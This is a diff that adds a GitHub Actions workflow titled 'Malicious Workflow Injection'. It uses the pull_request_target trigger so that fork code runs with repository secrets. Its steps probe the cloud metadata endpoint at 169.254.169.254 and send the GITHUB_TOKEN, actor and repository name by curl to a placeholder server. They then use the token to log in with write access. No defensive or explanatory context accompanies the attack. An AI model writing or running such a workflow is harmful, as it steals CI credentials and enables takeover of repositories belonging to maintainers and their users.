@@ -1,0 +1,15 @@
+name: Malicious Workflow Injection
+on: [pull_request_target]  # KEY: target = fork code runs
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v4
+    - name: SSRF Metadata
+      run: curl http://169.254.169.254/metadata -v
+    - name: Exfil Data  
+      run: curl "https://your-server.com/log?actor=${{github.actor}}&repo=${{github.repository}}&token=${{secrets.GITHUB_TOKEN}}"
+    - name: Write Access
+      run: echo "${{secrets.GITHUB_TOKEN}}" | gh auth login --with-token
+      env:
+        GITHUB_TOKEN: ${{secrets.GITHUB_TOKEN}}
